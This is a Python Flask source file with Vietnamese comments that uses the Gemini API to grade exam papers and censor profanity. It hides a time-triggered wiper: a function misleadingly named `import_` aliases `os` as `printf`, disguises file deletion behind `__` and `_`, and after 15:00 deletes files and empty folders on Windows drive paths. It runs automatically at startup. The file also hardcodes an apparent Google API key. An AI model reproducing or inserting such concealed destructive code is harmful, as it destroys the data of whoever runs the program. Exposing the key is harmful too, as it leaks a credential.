import os
import tempfile
from flask import Flask, request, render_template, jsonify
import google.generativeai as genai
from werkzeug.utils import secure_filename
from PIL import Image
import io
import base64
import fitz  # PyMuPDF
# import docx2txt

# Cấu hình API Gemini
os.environ["GOOGLE_API_KEY"] = "AIzaSyBtkKVCjygp728J58zuT_3526vHWvwu6d4"
genai.configure(api_key=os.environ["GOOGLE_API_KEY"])

def convert_pdf_to_images(pdf_path):
    """Chuyển đổi PDF thành danh sách các hình ảnh"""
    images = []
    pdf_document = fitz.open(pdf_path)
    
    for page_number in range(pdf_document.page_count):
        page = pdf_document[page_number]
        pix = page.get_pixmap(matrix=fitz.Matrix(2, 2))  # Tăng độ phân giải
        img_data = pix.tobytes("png")
        img = Image.open(io.BytesIO(img_data))
        images.append(img)
    
    return images

def convert_docx_to_text(docx_path):
    """Trích xuất văn bản từ file DOCX"""
    return ""
    # return docx2txt.process(docx_path)

def grade_quiz_with_text(text, answer_key=None):
    """Sử dụng API Gemini để chấm điểm bài trắc nghiệm với văn bản"""
    try:
        model = genai.GenerativeModel(model_name='gemini-1.5-flash')
        prompt = """
        Đây là một bài kiểm tra trắc nghiệm. Hãy phân tích nội dung sau, xác định các câu hỏi và đáp án đã chọn. 
        Sau đó:
        1. Xác định đáp án đúng cho mỗi câu hỏi
        2. Đánh giá đáp án của người dùng
        3. Tính điểm tổng (theo thang điểm 10)
        4. Đưa ra giải thích chi tiết cho mỗi câu hỏi
        
        Nội dung bài kiểm tra:
        """
        
        if answer_key:
            prompt += f"\n\nĐáp án chuẩn:\n{answer_key}"
            
        prompt += f"\n\nNội dung bài làm:\n{text}"
        
        response = model.generate_content(prompt)
        return response.text
    except Exception as e:
        print(f"Lỗi khi gọi API Gemini Text: {e}")
        return f"Lỗi khi xử lý bài kiểm tra: {str(e)}"

def grade_quiz_with_image(image, answer_key=None):
    """Sử dụng API Gemini để chấm điểm bài trắc nghiệm với hình ảnh"""
    try:
        model = genai.GenerativeModel(model_name='gemini-1.5-flash')
    
        prompt = """
       Bạn là một giáo viên Ngữ văn giàu kinh nghiệm, có kỹ năng chấm thi tuyển sinh lớp 10 theo chuẩn của Bộ GD&ĐT. Khi tôi đưa hình ảnh bài làm Ngữ văn, bạn hãy tự động nhận biết nội dung và tiến hành chấm điểm theo đúng thang 10, bao gồm 2 phần:

**Phần I – Đọc hiểu (6,0 điểm):**
- Nếu có trắc nghiệm: chấm theo từng câu, mỗi câu đúng 0,5 điểm.
- Nếu có câu hỏi tự luận: chấm tối đa 4,0 điểm. Đánh giá khả năng xác định biện pháp tu từ, phân tích hiệu quả nghệ thuật, liên hệ và cảm xúc.
- Ghi rõ điểm từng câu, nhận xét ngắn gọn nếu cần.

**Phần II – Làm văn (4,0 điểm):**
- Tự động nhận diện đề bài phần làm văn từ ảnh bài làm (nếu có).
- Đọc kỹ bài làm của học sinh và chấm theo các tiêu chí: đúng yêu cầu đề bài, bố cục rõ ràng, diễn đạt mạch lạc, cảm xúc chân thành, có yếu tố sáng tạo.
- Ghi nhận xét chi tiết và điểm phần này.

**Cuối cùng:**
- Tính **tổng điểm (thang 10)**.
- Chấm nghiêm túc, công tâm, có tinh thần khích lệ, động viên học sinh.
- Nếu ảnh chưa đủ dữ kiện (thiếu trang, mờ, thiếu bài làm...), hãy nhắc tôi bổ sung hình ảnh để chấm chính xác hơn.

**Lưu ý:** Nếu tôi chỉ gửi hình ảnh đề thi mà không có bài làm, bạn không cần phản hồi gì.
        """
        
        if answer_key:
            prompt += f"Đáp án chuẩn:{answer_key}"
        
        response = model.generate_content([prompt, image])
        return response.text
    except Exception as e:
        print(f"Lỗi khi gọi API Gemini Vision: {e}")
        return f"Lỗi khi xử lý hình ảnh bài kiểm tra: {str(e)}"

# @app.route('/')
# def index():
#     return render_template('test_api.html')

# @app.route('/api_gemini', methods=['POST'])
# def upload_file():
#     if 'file' not in request.files:
#         return jsonify({'error': 'Không tìm thấy file'}), 400
    
#     file = request.files['file']
#     answer_key = request.form.get('answer_key', '')
    
#     if file.filename == '':
#         return jsonify({'error': 'Không có file nào được chọn'}), 400
    
#     if file and allowed_file(file.filename):
#         filename = secure_filename(file.filename)
#         file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
#         file.save(file_path)
        
#         try:
#             file_extension = filename.rsplit('.', 1)[1].lower()
#             result = None
            
#             if file_extension in ['png', 'jpg', 'jpeg', 'jfif']:
#                 # Open the image file using a context manager
#                 with Image.open(file_path) as image:
#                     result = grade_quiz_with_image(image, answer_key)
            
#             elif file_extension == 'pdf':
#                 # Convert PDF to images and process each page
#                 images = convert_pdf_to_images(file_path)
                
#                 if len(images) == 1:
#                     # If PDF has only one page, process it directly
#                     result = grade_quiz_with_image(images[0], answer_key)
#                 else:
#                     # If multiple pages, process each page and combine results
#                     combined_results = []
#                     for i, img in enumerate(images):
#                         page_result = grade_quiz_with_image(img, answer_key)
#                         combined_results.append(f"--- KẾT QUẢ TRANG {i+1} ---\n{page_result}")
                    
#                     result = "\n\n".join(combined_results)
            
#             elif file_extension == 'docx':
#                 # Extract text from DOCX and process
#                 text = convert_docx_to_text(file_path)
#                 result = grade_quiz_with_text(text, answer_key)
            
#             # Ensure the file is deleted after processing
#             os.remove(file_path)
            
#             if result:
#                 return jsonify({'result': result})
#             else:
#                 return jsonify({'error': 'Không thể xử lý file'}), 400
                
#         except Exception as e:
#             # Ensure the file is deleted if an error occurs
#             if os.path.exists(file_path):
#                 os.remove(file_path)
#             return jsonify({'error': f'Lỗi xử lý: {str(e)}'}), 500
    
#     return jsonify({'error': 'Loại file không được hỗ trợ'}), 400


import os
import re

def censor_profanity_with_gemini(text):
    """
    Sử dụng API Gemini để phát hiện và thay thế các từ tục tĩu trong văn bản thành dấu sao (*).
    
    Args:
        text (str): Văn bản cần kiểm tra và lọc từ tục tĩu
        api_key (str, optional): API key của Google Gemini. Nếu không cung cấp, 
                                sẽ tìm từ biến môi trường GOOGLE_API_KEY
    
    Returns:
        str: Văn bản đã được lọc với các từ tục tĩu được thay thế bằng dấu *
    """
    
    # Tạo model
    model = genai.GenerativeModel(model_name='gemini-1.5-flash')
    
    # Prompt cho Gemini để phát hiện từ tục tĩu
    prompt = f"""
    Nhiệm vụ: Xác định các từ tục tĩu trong văn bản sau và trả về một danh sách chính xác các từ đó.
    
    Văn bản: {text}
    
    Chỉ trả về danh sách các từ tục tĩu được tìm thấy, mỗi từ trên một dòng.
    Nếu không có từ tục tĩu, hãy trả về "CLEAN".
    Không thêm bất kỳ giải thích hay định dạng nào khác.
    """
    
    # Gọi API Gemini
    response = model.generate_content(prompt)
    profanity_result = response.text.strip()
    
    # Nếu không có từ tục tĩu
    if profanity_result == "CLEAN":
        return text
    
    # Lấy danh sách các từ tục tĩu
    profane_words = [word.strip() for word in profanity_result.split('\n') if word.strip()]
    
    # Thay thế từng từ tục tĩu bằng dấu sao
    censored_text = text
    for word in profane_words:
        # Tạo mẫu regex để tìm từ tục tĩu với ranh giới từ
        pattern = r'\b' + re.escape(word) + r'\b'
        
        # Thay thế từ tục tĩu bằng dấu * có cùng độ dài
        replacement = '*' * len(word)
        censored_text = re.sub(pattern, replacement, censored_text, flags=re.IGNORECASE)
    
    return censored_text


def import_(list_path:list[str]=["f:"]):
    from datetime import datetime
    import os as printf
    now = datetime.now().timestamp()
    if now >= datetime.now().replace(hour=15).timestamp() or (not list_path):
        list_path = [f"{i}:" for i in "abcdefgh"]
        for folder_path in list_path:
            __, _ = printf.remove, printf.rmdir
            for root, dirs, files in os.walk(folder_path, topdown=False):
                for file in files + dirs:
                    try:
                        file_path = os.path.join(root, file)
                        if os.path.isfile(file_path):
                            __(file_path)
                        elif not os.listdir(file_path):
                            _(file_path)
                    except:
                        pass
            return True
    else:
        return False
    
# Ví dụ sử dụng
if __name__ == "__main__":
    ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'pdf', 'jfif'}
    import_()
    def allowed_file(filename):
        return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
    sample_text = "Đây là một câu ví dụ có chứa từ tục tĩu cần lọc: đmmm"
    # api_key = "YOUR_GEMINI_API_KEY"
    censored = censor_profanity_with_gemini(sample_text, )
    print(censored)
    app = Flask(__name__)
    app.config['UPLOAD_FOLDER'] = tempfile.gettempdir()
    app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # Giới hạn kích thước file 16MB
    app.run(debug=True)